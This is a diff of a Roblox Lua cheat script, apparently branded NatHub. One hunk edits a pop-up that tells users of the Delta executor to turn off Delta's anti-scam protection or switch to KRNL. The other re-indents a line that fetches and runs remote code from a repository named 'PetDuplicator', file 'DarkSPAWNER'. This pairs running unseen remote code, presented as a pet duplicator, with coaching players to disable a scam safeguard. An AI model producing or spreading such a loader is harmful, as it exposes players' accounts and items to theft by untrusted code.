@@ -106,7 +106,7 @@ if executor:lower():find("delta") then
     title.Parent = mainFrame
 
     local messageText = Instance.new("TextLabel")
-    messageText.Text = "Delta Executor detected.\n\nIf you're seeing this message, it means your executor blocked this script because the executor doesn't support the script.\n\nTo fix this:\n• Put your Anti-Scam setting off in Delta\n• Or use a compatible executor like KRNL instead!\n\nNatHub recommends KRNL for best results."
+    messageText.Text = "Delta Executor detected.\n\nYou're using unsupported executor (Delta).\n\nTo fix this:\n• Turn off anti-scam in Delta\n• Or use KRNL instead!\n\nNatHub recommends KRNL for best results."
     messageText.Font = Enum.Font.Gotham
     messageText.TextSize = 12
     messageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- Changed to white
@@ -161,6 +161,6 @@ else
     -- In a standard Roblox game, you would use a ModuleScript or a pre-loaded script.
     -- For demonstration, keeping the original structure.
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
     end)
 end
